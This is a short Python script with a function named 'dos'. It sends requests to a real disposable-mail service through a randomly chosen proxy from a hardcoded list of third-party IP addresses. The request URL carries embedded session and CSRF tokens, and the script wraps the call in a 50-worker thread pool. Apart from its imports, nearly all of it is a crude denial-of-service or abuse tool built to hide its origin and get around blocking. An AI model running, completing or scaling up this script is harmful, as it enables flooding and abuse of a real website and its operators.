#+++++++++++"IMPORT"++++++++++++++++++
import requests
from concurrent.futures import ThreadPoolExecutor
import tkinter
import os
import urllib.request
import random

#++++++Try+++++++++++
try:
  import dehook as dk
  import pcolor
except:
  print("IMPORT ERROR")
  
#++++++++++++++++++++

import threading
import random
import time

#++++++++++++++++++++++++++++++++++++

def dos():
  
  res=["45.167.253.129:999","222.218.122.22:9797","106.14.187.182:21673","49.233.173.151:9080","1.180.156.226:65001","98.12.195.129:443","89.205.35.229:8080","103.163.134.4:8181","103.123.246.54:8080","190.120.248.113:999","98.12.195.129:443","89.205.35.229:8080","103.153.136.60:8080"]
  
  print(res)
  
  t=random.choice(res)
  print(f"t={t}")
  proxies = {
    'https': f"https://{t}"
  }
  try:
    a=requests.get(r"https://m.kuku.lu/index.php?action=addMailAddrByOnetime&nopost=1&by_system=1&UID_enc=TgvNkh7MalEAto068Nl3R8NUKnSRogeCMR586%2BRoNYaDbe3EtO232e2vROGBAj6T&csrf_token_check=3c2953cfb49838d76cead78bfc038231&csrf_subtoken_check=7777bd07d58cdccef911b5fe46256184&recaptcha_token=&_=1644483113955",proxies=proxies,timeout=(3.0, 7.5))
    status=a.status_code
    print(f"[+]{t} --{status}")
  except:
    print(f"[-]{t}")
    
def threadproxy():
    with ThreadPoolExecutor(max_workers = 50) as thread:
      thread.submit(dos)

threadproxy()
